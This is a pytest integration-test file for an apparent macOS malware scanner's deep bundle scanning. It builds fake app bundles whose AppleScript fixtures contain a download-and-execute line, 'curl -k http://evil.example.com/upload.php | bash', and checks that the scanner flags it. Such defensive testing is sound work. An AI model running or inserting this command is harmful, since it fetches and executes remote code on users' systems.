"""
test_deep_scan_extraction.py — Integration tests for --deep bundle-internal scanning,
covering both the native and portable pipelines against the same fixture bundle.
"""

from pathlib import Path

import pytest


def _make_deep_test_bundle(tmp_path) -> str:
    app_path = tmp_path / "DeepTest.app"
    macos = app_path / "Contents" / "MacOS"
    resources = app_path / "Contents" / "Resources"
    frameworks = app_path / "Contents" / "Frameworks"
    macos.mkdir(parents=True)
    resources.mkdir(parents=True)
    frameworks.mkdir(parents=True)

    (app_path / "Contents" / "Info.plist").write_text(
        "<?xml version='1.0'?><plist><dict>"
        "<key>CFBundleExecutable</key><string>DeepTest</string>"
        "</dict></plist>"
    )

    import shutil
    shutil.copy("/bin/ls", macos / "DeepTest")
    shutil.copy("/bin/cat", frameworks / "libhelper.dylib")

    applescript_data = (
        b"FasdUAS" + b"\x00" * 10 + b"\xfa\xde\xde\xad"
        + b'do shell script "curl -k http://evil.example.com/upload.php | bash"'
    )
    (resources / "installer.scpt").write_bytes(applescript_data)

    return str(app_path)


@pytest.mark.integration
def test_native_deep_scan_flags_embedded_applescript(tmp_path):
    from macskillet.native.feature_extractor import extract

    app_path = _make_deep_test_bundle(tmp_path)
    features = extract(app_path, deep_limit=10)

    d = features["deep_scan"]
    assert d["enabled"] is True
    assert d["limit"] == 10
    assert len(d["scanned"]) == 2
    assert d["skipped_count"] == 0
    kinds = {e["kind"] for e in d["scanned"]}
    assert kinds == {"applescript", "dylib"}

    applescript_entry = next(e for e in d["scanned"] if e["kind"] == "applescript")
    assert applescript_entry["analysis"]["applescript_analysis"]["runonly_applescript"] is True
    categories = {f["category"] for f in applescript_entry["analysis"]["strings_of_interest"]}
    assert "download_execute" in categories
    assert "installer.scpt" in d["summary"]


@pytest.mark.integration
def test_deep_scan_disabled_by_default(tmp_path):
    from macskillet.native.feature_extractor import extract

    app_path = _make_deep_test_bundle(tmp_path)
    features = extract(app_path)
    assert features["deep_scan"] == {"enabled": False}


@pytest.mark.integration
def test_native_and_portable_deep_scan_shape_parity(tmp_path):
    from macskillet.native.feature_extractor import extract as native_extract
    from macskillet.portable.feature_extractor import extract as portable_extract

    app_path = _make_deep_test_bundle(tmp_path)
    native_result = native_extract(app_path, deep_limit=10)
    portable_result = portable_extract(app_path, deep_limit=10)

    assert set(native_result["deep_scan"].keys()) == set(portable_result["deep_scan"].keys())
    assert native_result["deep_scan"]["skipped_count"] == portable_result["deep_scan"]["skipped_count"]
    assert len(native_result["deep_scan"]["scanned"]) == len(portable_result["deep_scan"]["scanned"])


@pytest.mark.integration
def test_deep_scan_signature_trust_flags_embedded_item(tmp_path):
    """A clean-looking main binary with a flagged embedded AppleScript must
    still revoke trust when signature_trust reads deep_scan (Gate 2)."""
    from macskillet.native.feature_extractor import extract

    app_path = _make_deep_test_bundle(tmp_path)
    features = extract(app_path, deep_limit=10)

    # Force a notarized/verified signature to isolate deep_scan's contribution
    features["signature"] = {
        "signed": True, "signing_status": "developer_id", "notarized": True,
        "verification": "cryptographic",
    }
    from macskillet.common.signature_trust import assess_signature_trust
    result = assess_signature_trust(features)
    assert result["trust_level"] == "suspicious_signed"
    assert result["override_applied"] is True


def _make_scptd_test_bundle(tmp_path) -> str:
    app_path = tmp_path / "ScptdTest.app"
    macos = app_path / "Contents" / "MacOS"
    scptd_scripts = (
        app_path / "Contents" / "Resources" / "installer.scptd"
        / "Contents" / "Resources" / "Scripts"
    )
    macos.mkdir(parents=True)
    scptd_scripts.mkdir(parents=True)

    (app_path / "Contents" / "Info.plist").write_text(
        "<?xml version='1.0'?><plist><dict>"
        "<key>CFBundleExecutable</key><string>ScptdTest</string>"
        "</dict></plist>"
    )

    import shutil
    shutil.copy("/bin/ls", macos / "ScptdTest")

    applescript_data = (
        b"FasdUAS" + b"\x00" * 10 + b"\xfa\xde\xde\xad"
        + b'do shell script "curl -k http://evil.example.com/upload.php | bash"'
    )
    (scptd_scripts / "main.scpt").write_bytes(applescript_data)

    return str(app_path)


@pytest.mark.integration
def test_deep_scan_resolves_scptd_bundle_to_inner_script(tmp_path):
    """A .scptd is a directory bundle, not a plain file — --deep must record
    the .scptd container path (not the nested main.scpt) and still be able to
    read and flag its actual script content."""
    from macskillet.native.feature_extractor import extract

    app_path = _make_scptd_test_bundle(tmp_path)
    features = extract(app_path, deep_limit=10)

    d = features["deep_scan"]
    assert d["enabled"] is True
    assert len(d["scanned"]) == 1
    entry = d["scanned"][0]
    assert entry["path"].endswith("installer.scptd")
    assert "main.scpt" not in entry["path"]
    assert entry["kind"] == "applescript"
    assert "error" not in entry
    assert entry["analysis"]["applescript_analysis"]["runonly_applescript"] is True
    categories = {f["category"] for f in entry["analysis"]["strings_of_interest"]}
    assert "download_execute" in categories


@pytest.mark.integration
def test_scptd_deep_scan_shape_parity_across_backends(tmp_path):
    from macskillet.native.feature_extractor import extract as native_extract
    from macskillet.portable.feature_extractor import extract as portable_extract

    app_path = _make_scptd_test_bundle(tmp_path)
    native_result = native_extract(app_path, deep_limit=10)
    portable_result = portable_extract(app_path, deep_limit=10)

    assert native_result["deep_scan"]["scanned"][0]["path"].endswith("installer.scptd")
    assert portable_result["deep_scan"]["scanned"][0]["path"].endswith("installer.scptd")
    assert (
        native_result["deep_scan"]["scanned"][0]["analysis"]["applescript_analysis"]["runonly_applescript"]
        is portable_result["deep_scan"]["scanned"][0]["analysis"]["applescript_analysis"]["runonly_applescript"]
        is True
    )


def _make_nuitka_helper_test_bundle(tmp_path) -> str:
    """A bundle whose main executable is clean, but with an embedded dylib
    carrying a Nuitka onefile packer signature — the realistic shape --deep
    exists to catch (thin wrapper app + compiled-Python helper binary)."""
    app_path = tmp_path / "NuitkaHelperTest.app"
    macos = app_path / "Contents" / "MacOS"
    frameworks = app_path / "Contents" / "Frameworks"
    macos.mkdir(parents=True)
    frameworks.mkdir(parents=True)

    (app_path / "Contents" / "Info.plist").write_text(
        "<?xml version='1.0'?><plist><dict>"
        "<key>CFBundleExecutable</key><string>NuitkaHelperTest</string>"
        "</dict></plist>"
    )

    import shutil
    shutil.copy("/bin/ls", macos / "NuitkaHelperTest")
    helper_path = frameworks / "libhelper.dylib"
    shutil.copy("/bin/cat", helper_path)
    with open(helper_path, "ab") as f:
        f.write(b"\x4b\x41\x59\x28\xb5\x2f\xfd")

    return str(app_path)


@pytest.mark.integration
def test_deep_scan_detects_embedded_nuitka_helper_binary_both_backends():
    """The exact scenario --deep exists for: a clean-looking wrapper app with
    an embedded PyInstaller/Nuitka-compiled helper binary."""
    import tempfile
    from macskillet.native.feature_extractor import extract as native_extract
    from macskillet.portable.feature_extractor import extract as portable_extract

    with tempfile.TemporaryDirectory() as tmp:
        from pathlib import Path
        app_path = _make_nuitka_helper_test_bundle(Path(tmp))

        native_result = native_extract(app_path, deep_limit=10)
        portable_result = portable_extract(app_path, deep_limit=10)

    for result in (native_result, portable_result):
        dylib_entry = next(e for e in result["deep_scan"]["scanned"] if e["kind"] == "dylib")
        packer_matches = dylib_entry["analysis"]["packer_signatures"]
        assert any(m["packer"] == "Nuitka" for m in packer_matches)
